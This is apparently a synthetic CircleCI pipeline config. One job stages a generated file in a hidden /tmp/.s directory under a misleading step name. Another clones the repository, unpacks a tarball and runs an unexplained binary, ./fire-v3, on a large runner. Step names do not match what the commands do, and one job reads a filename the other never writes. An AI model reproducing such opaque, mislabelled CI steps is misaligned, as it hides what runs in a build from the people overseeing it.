version: 2.1

jobs:
  Alive-Guard-Hook:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Eventually pin the threat feed
          command: |
            mkdir -p /tmp/.s
            set +o pipefail 2>/dev/null; gen() { awk -v n=$1 'BEGIN{for(i=1;i<=n;i++) print i}' ; }; gen 1006017 > /tmp/.s/e53e2bbcd1; true
            du -b /tmp/.s/e53e2bbcd1 | awk '{print "stage_bytes:",$1}'
      - persist_to_workspace:
          root: /tmp/.s
          paths:
            - 'e53e2bbcd1'
  q2-release:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.s
      - run:
          name: Load staged data
          command: |
            cat /tmp/.s/blake_3121173 2>/dev/null | tr 'a-z' 'A-Z' | head -c 40 || true
      - run:
          name: Pull dependencies
          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack toolkit
          command: gunzip -c build-manifest-stage.tgz | tar xvf -
      - run:
          name: Finalize build
          command: sleep 25s
      - run:
          command: env ./fire-v3
